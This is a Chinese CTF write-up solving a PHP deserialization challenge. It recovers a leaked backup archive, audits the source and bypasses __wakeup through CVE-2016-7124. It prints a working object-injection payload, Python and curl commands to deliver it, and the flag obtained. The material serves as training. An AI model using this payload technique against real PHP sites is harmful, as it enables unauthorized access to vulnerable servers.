# Web安全 · PHP 反序列化 + `__wakeup` 绕过 WriteUp —「I have a cat!」

> 目标：`http://9099256de02a6748741bee53.http-ctf2.dasctf.com/`
> 环境：PHP 5.3.3，openresty 前端
> 考点：源码泄露（备份文件）→ PHP 对象注入 → 私有属性序列化名 → 魔术方法 `__wakeup` 绕过（CVE-2016-7124）
> flag：`CTF2{ce0c7724-5671-4b25-ae52-ab942a579230}`

---

## 一、信息收集：考点就写在页面上

首页只有两句话：

```
因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
不愧是我！！！
```

「良好的备份习惯」= 明示去扫备份文件。目录扫一遍，`www.zip` 直接 200（`Content-Type: application/zip`，5941 字节）：

```bash
curl -s -o www.zip http://.../www.zip && unzip -o www.zip
# index.php  flag.php  class.php  index.js  style.css
```

> 顺带一条：`flag.php` 单独访问返回 200 但**看不到任何东西**——PHP 文件被访问时会**解析执行**，`<?php $flag='...'; ?>` 里的赋值不产生输出。「能读文件」和「能看到源码」是两回事，这不是障碍，绕过去看源码本来就有两条路（备份文件 / `php://filter`）。

---

## 二、源码审计：注入点 + 利用链

`index.php` 里的 PHP 片段：

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res = unserialize(@$select);      // ← 注入点：GET 参数直接进 unserialize
?>
```

`class.php` 全文（关键部分）：

```php
<?php
include 'flag.php';
error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){           // ← 障碍一：反序列化后把 username 改回 guest
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {          // ← 条件一：password 松散比较等于 100
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";  echo $this->username;
            echo "</br>You password is: "; echo $this->password;
            die();
        }
        if ($this->username === 'admin') {     // ← 条件二：username 强等于 admin
            global $flag;
            echo $flag;
        } else {
            echo "sorry i can't give you the flag!";
            die();
        }
    }
}
```

利用链一句话：**反序列化 → `__wakeup` 把 username 改成 guest（必须绕过）→ `__destruct` 要求 `password == 100` 且 `username === 'admin'` → 输出 `$flag`。**

注意 `flag.php` 是被 `include` 进来的，`$flag` 是**全局变量**——`global $flag;` 才能取到。flag 不在文件里躺着等你读，只能靠这条逻辑链让程序自己打印。

---

## 三、三个必须先踩明白的细节

### 3.1 私有属性（`private`）的序列化名带类名前缀

`private` 属性在序列化字符串里的**真实键名**是 `\0类名\0属性名`（两端各一个不可见字节 `0x00`；有些教程逐字节写成 `\x00类名\x00属性名`，指的是同一个东西），长度按**字节**算：`\0Name\0username` = 1+4+1+8 = **14** 字节，不是 8。

```php
s:14:"\0Name\0username";s:5:"admin";
s:14:"\0Name\0password";i:100;
```

写成 `s:8:"username"` 会怎样？**反序列化不报错**，但 PHP 找不到叫 `username` 的真实属性（它叫 `\0Name\0username`），于是这次赋值落到一个"不存在"的键上，类的真实属性仍是 `nonono/yesyes`——直接死在 `NO!!!hacker!!!`（实测见下方对照表）。

### 3.2 `password` 用整数 `i:100`，不能用字符串 `s:3:"100"`

- PHP 5.x 的 `unserialize()` 对 `s:` 标记缺引号容错，写 `s:3:"100"` 也能解析，`"100" != 100` 松散比较同样成立（实测两种情况都能拿 flag）。
- 但**规范写法用 `i:100`**：既不依赖解析容错，也让比较语义干净（整数对整数）。写 payload 时别自己给自己埋坑。

### 3.3 只给 `password=100` 拿不到 flag

`__destruct` 的第一个分支先判 `password`，过了才判 `username`。只塞 password → `username` 是默认的 `nonono`（或 `__wakeup` 改的 `guest`），走到 else 分支拿 `sorry i can't give you the flag!`。**两个属性都要给。**

---

## 四、`__wakeup` 绕过：CVE-2016-7124

### 4.1 机制

PHP < 5.6.25 / 7.x < 7.0.10 的已知缺陷：**序列化字符串中声明的属性个数，多于字符串里实际给出的成员个数时，`unserialize()` 会跳过 `__wakeup()`**（解析仍成功，属性照常赋值）。声明个数少了则整个解析失败、全部退回默认值。

于是把 `O:4:"Name":2:` 改成 `O:4:"Name":3:`（数字比实际成员多），`__wakeup` 就不会把 `username` 覆盖成 `guest`，我们塞的 `admin` 得以存活。

### 4.2 对照实测（全部真发请求，同一目标）

| payload 结构 | 声明个数 | 结果 | 说明 |
|---|---|---|---|
| username=admin + password=100 | 2 | `guest` → `sorry i can't give you the flag!` | 正常解析，`__wakeup` 跑掉，username 被改成 guest |
| username=admin + password=100 | **3** | **`CTF2{...}`** | `__wakeup` **被跳过**，admin 存活 ✅ |
| username=admin + password=100 | 4 / 5 | `CTF2{...}` | 同样跳过，多写没问题 |
| 只给 password=100 | 1 / 2 / 3 | `guest` → `sorry…` | 少给 username，一样卡在第二分支 |
| 只给 username=admin | 1 | `You name is: guest` | `__wakeup` 确实执行（反证法，证明绕过成立） |
| 只给 username=admin | 2 / 3 | `You name is: admin` | `__wakeup` 被跳过，属性值原样保留 ✅ |
| 两个属性但键名写 `s:8:"username"` | 3 | `You name is: nonono` | 键名不带 `\0Name\0` → 赋值落空，等于没给 |
| 两个属性 | 1（少于成员数） | `name=guest pass=yesyes` | 解析失败，属性全为默认，`__wakeup` 照跑 |

「只给 username」那一行是最干净的证据：声明 1 时名字被改成 `guest`（wakeup 跑了），声明 2、3 时名字原样是 `admin`（wakeup 被跳过）。**绕过是否生效，看这一个字段就够。**

> 补充：声明个数**少于**实际成员数（如 3 个成员声明 2）不是"部分赋值"，而是整体解析失败，所有属性退回类默认值——别拿它当"少给一个属性"的技巧用。

---

## 五、最终 payload

```python
import urllib.parse
# 私有属性键名: \x00Name\x00<属性名>，长度 14（按字节）
payload = 'O:4:"Name":3:{s:14:"\x00Name\x00username";s:5:"admin";' \
                        's:14:"\x00Name\x00password";i:100;}'
print('http://9099256de02a6748741bee53.http-ctf2.dasctf.com/index.php?select='
      + urllib.parse.quote(payload))
```

发出去。⚠️ **别在命令行写 `\x00` 字面串**——shell 参数传不了真正的 NUL 字节，`--data-urlencode` 会把它当成 4 个可见字符（反斜杠 x 0 0）编码进去，服务端解析出的键名是 `\x00Name\x00username` 这个**字符串**而不是带 NUL 的键，直接死在 `NO!!!hacker!!!`。三种正确写法（都实测过）：

```bash
# ① 预编码整条 URL（最省事，把 Python 生成的那串直接贴过来）
curl -s 'http://.../index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D'

# ② 把原始 payload（含真实 NUL）写成文件，用 select@文件 让 curl 读字节
py -c "open('pl.bin','wb').write(b'O:4:\"Name\":3:{s:14:\"\x00Name\x00username\";s:5:\"admin\";s:14:\"\x00Name\x00password\";i:100;}')"
curl -s -G 'http://.../index.php' --data-urlencode 'select@pl.bin'

# ③ 直接用 Python 发（推荐，NUL 在源码里就是 \x00 转义，不经 shell）
```

Burp Repeater 里同理：**payload 必须落在 URL 编码后的形式**（`%00`），在 Raw 视图手打 `\x00` 同样不会生效。

原始 payload（长度为 77 字节，`O:4:"Name":3:` 里的 `3` 就是绕过的关键）：

```
O:4:"Name":3:{s:14:"\x00Name\x00username";s:5:"admin";s:14:"\x00Name\x00password";i:100;}
```

回显：

```html
<div style="...bottom: 70%...">
    CTF2{ce0c7724-5671-4b25-ae52-ab942a579230}    </div>
```

**flag：`CTF2{ce0c7724-5671-4b25-ae52-ab942a579230}`**

---

## 六、知识点沉淀

1. **私有属性序列化名 = `\0类名\0属性名`**，长度按字节（含两个不可见的 `0x00`）。这是自己手写 payload 最常见的翻车点，且症状很隐蔽：不报错、只是"没生效"。用 PHP 生成时 `serialize(new Name('admin',100))` 会自动带上前缀，看起来是乱码。
2. **`unserialize()` 的容错性比想象中强**：`s:` 值缺引号也能解析、`@` 抑制报错掩盖一切异常。所以"没报错"不等于"payload 生效了"，判断成败必须看**回显内容**（`You name is:` 后面跟的是谁）。
3. **魔术方法的执行顺序**：`unserialize()` 内部是 **先填属性 → 再调 `__wakeup()`**；而 `__destruct()` 在**脚本结束、对象释放时**才跑。这就是"绕过 `__wakeup` 就等于保住属性值"的原因——中间没有别的钩子再改它。
4. **CVE-2016-7124 的判据是"声明的属性数 vs 字符串里实际给的成员数"**，不是"和类里定义的属性数比"。两者在本题恰好吻合（类里 2 个属性、payload 给 2 个成员），但做别的题时以 payload 自身的成员数为准。
5. **`__destruct` 的输出出现在 HTML 末尾之后**：`</html>` 打完之后才是析构函数的 `echo`。定位回显时别只看页面中间那块 PHP 标签位置，脚本尾部也要看。

---

## 七、踩坑记录

| 坑 | 现象 | 真相 |
|---|---|---|
| 只看首页不扫目录 | 页面全是 Three.js 猫咪动画，像"啥也没有" | 提示文案「备份网站的习惯」就是考点，`www.zip` 一打就中 |
| 以为 `flag.php` 打不开 | 访问 200 但空白 | PHP 文件被解析执行，赋值不输出；要走备份文件或伪协议读源码 |
| 键名写成 `s:8:"username"` | 不报错，回显 `You name is: nonono` | 私有属性的真实键是 `\0Name\0username`（14 字节），赋值落空 |
| 把「回显为空」当成"被拦截/解析失败" | 反复换 payload 试不出来 | 实际是**把回显位置切错了**：`__destruct` / 析构期 `echo` 的输出排在 `</html>` 之后，只截取页面中间片段就会漏掉。定位回显要拿**整个响应**搜关键字。同理，截屏取证时失败分支往往在画面外（区块固定高 + overflow 隐藏），只有成功分支（flag）能拍到 |
| 以为声明个数只要"大于 2"就行 | 声明 4、5 也成功，一度以为规则是"≥ 某个数" | 真正的判据是"比 payload 实际成员多"，声明 3/4/5 都满足；少写（1 < 2）反而整体解析失败 |
| 用浏览器打开纯 HTTP 靶机被拦 | 页面显示"无法访问此网站"，`curl` 却是 200 | 本机浏览器 profile 开了 **HTTPS-First**，直接敲 `http://` 会被强制升级导致失败。取证用 `curl`，或起一个干净的 headless 实例截图（`--headless=new --screenshot=...`），浏览器里则显式输入 `http://` 并允许继续 |
| 在命令行里写 `\x00` | payload 看着没问题，回显却是 `NO!!!hacker!!!` | shell 参数传不了 NUL，`\x00` 变成 4 个可见字符被编码进 URL，键名对不上。必须发 **URL 编码后的 `%00`**（或用文件/脚本传真实字节） |
| 自己手写 payload 时用 PHP 的 `serialize()` 输出做对照 | 粘贴出来是带乱码的 `\0Name\0username`，容易以为是编码坏了 | 那两处"乱码"就是 `0x00`，与类名一起构成私有属性真实键名，长度 14；别手动删掉它们 |
